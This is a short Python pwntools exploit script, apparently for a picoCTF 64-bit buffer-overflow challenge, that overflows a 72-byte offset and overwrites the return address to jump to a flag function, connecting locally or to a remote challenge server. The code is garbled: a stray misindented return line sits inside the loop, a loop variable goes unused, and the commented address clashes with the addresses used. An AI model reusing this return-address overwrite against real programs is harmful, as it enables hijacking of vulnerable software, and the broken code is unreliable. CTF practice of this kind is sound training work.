#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("vuln")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("saturn.picoctf.net", 54242)
    else:
        return process(elf.path)

io = start()

# flag address 0x401236, found using objdump -d vuln | grep flag
# offset to ret: 72
flag = 0x401246

for i in range(8):
    flag += 0x2
    payload = b"A"*72 + p64(0x40123a) # can also be done using elf.sym.flag locally

        return remote("saturn.picoctf.net", 54242)
    io.sendlineafter(b"Welcome to 64-bit. Give me a string that gets you the flag:", payload)

    io.recvline()
